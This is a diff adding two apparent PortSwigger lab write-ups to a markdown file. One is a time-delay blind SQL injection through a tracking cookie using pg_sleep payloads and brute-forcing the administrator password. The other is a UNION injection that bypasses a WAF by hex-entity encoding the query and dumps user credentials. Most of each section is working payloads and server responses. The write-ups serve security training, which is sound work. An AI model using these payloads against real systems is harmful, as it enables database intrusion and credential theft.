@@ -878,11 +878,232 @@ TrackingId=1Pe7nqjCl5ZZt9q7' ||(SELECT pg_sleep(10))--'
 
 
 
+<details>
+	<summary>Lab: Blind SQL injection with time delays and information retrieval</summary>
+
+
+> ###  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.The database contains a different table called ``users``, with columns called ``username`` and ``password``. You need to exploit the blind SQL injection vulnerability to find out the password of the ``administrator`` user.
+
+> To solve the lab, log in as the ``administrator`` user. 
+
+
+---
+
+First test if vuln by make delay ``10s``
+
+```url
+TrackingId=UEptVxSAS3n40Lpj'||(SELECT pg_sleep(10)) --
+```
+
+and it work so it vulnarable 
+
+now we want to make sure that there is user called ``administrator``
+
+```url
+TrackingId=UEptVxSAS3n40Lpj'|| (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from users) --
+```
+
+delay happend so user is exist 
+
+now will find passowrd length by send this request to intruder and change 1 to range form ``1 to 30``
+
+```url
+TrackingId=UEptVxSAS3n40Lpj'|| (SELECT CASE WHEN (username='administrator' and LENGTH(password)=1) THEN pg_sleep(10) ELSE pg_sleep(0) END from users) --
+```
+
+![image](https://github.com/user-attachments/assets/653beef2-c0e8-4309-aab0-51eeeb150031)
+
+so length is ``20``
+
+now do brute force to find password
+
+```url
+TrackingId=UEptVxSAS3n40Lpj'|| (SELECT CASE WHEN (username='administrator' and substr(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END from users) --
+```
+
+
+<details>
+	<summary>the payload</summary>
+
+```
+a
+b
+c
+d
+e
+f
+g
+h
+i
+j
+k
+l
+m
+n
+o
+p
+q
+r
+s
+t
+u
+v
+w
+x
+y
+z
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+```
+
+ 
+</details>
+
+
+```
+[1]  [2]  [3]  [4]  [5]  [6]  [7]  [8]  [9]  [10]  [11]  [12]  [13]  [14]  [15]  [16]  [17]  [18]  [19] [20]
+ f    n    v    q    9    x    0    4    m    z      f    r     j     8     x      2    t      d     1   o
+```
+
+
+**``Password``**
+
+```
+fnvq9x04mzfrj8x2td1o
+```
+ 
+</details>
 
 
 
 
 
+
+
+
+
+
+
+
+---
+
+<details>
+	<summary>Lab: SQL injection with filter bypass via XML encoding</summary>
+
+> ###  This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
+
+> The database contains a ``users`` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account. 
+
+* <details>
+	<summary>Hint</summary>
+
+	> ## A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the **``Hackvertor``** extension to do this. 
+ 
+  </details>
+
+
+---
+
+to know how number of columns
+
+```
+<storeId>1 UNION SELECT NULL</storeId>
+```
+
+but but the firewall will send forbidden 
+
+```http
+HTTP/2 403 Forbidden
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 17
+
+
+"Attack detected"
+```
+
+from ``hackvertor`` do encode to ``UNION SELECT NULL`` using ``hex_entities`` that you bypass the firewall
+
+```html
+1 <@hex_entities> UNION SELECT NULL </@hex_entities>
+```
+
+```http
+HTTP/2 200 OK
+Content-Type: text/plain; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 14
+
+
+
+921 units
+null
+```
+
+so it have 1 column now get username and password 
+
+```html
+1 <@hex_entities>
+
+UNION SELECT username || ' = ' || password FROM users
+
+</@hex_entities>
+```
+
+
+```http
+HTTP/2 200 OK
+Content-Type: text/plain; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 106
+
+
+
+carlos = 7pvl2i5kf9bz7cmzq9pc
+administrator = 9soloagn82b9rgya99uw
+wiener = ee0as2ryc270mq7aw8ir
+921 units
+```
+
+
+ 
+</details>
 
 
 
